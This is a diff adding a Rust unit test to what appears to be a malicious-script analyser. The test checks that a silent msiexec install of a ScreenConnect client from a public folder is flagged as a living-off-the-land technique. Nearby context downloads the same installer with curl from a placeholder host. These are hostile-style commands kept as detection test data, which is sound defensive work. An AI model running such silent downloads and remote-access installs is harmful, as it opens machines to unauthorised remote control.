@@ -9346,6 +9346,27 @@ mod msiexec_tests {
     }
 
     #[test]
+    fn msiexec_local_package_argument_emits_lolbas_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"msiexec /i "C:\Users\Public\ScreenConnect.ClientSetup.msi" /qn /norestart"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Lolbas { name, cmd }
+                    if name == "msiexec" && cmd.contains("ScreenConnect.ClientSetup.msi")
+            )
+        });
+        assert!(
+            has,
+            "msiexec local package did not emit LOLBAS trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msiexec_local_package_resolves_prior_download_source() {
         let report = analyze(
             br#"curl -o ScreenConnect.ClientSetup.msi "https://msiexec-local.example/ScreenConnect.ClientSetup.msi"
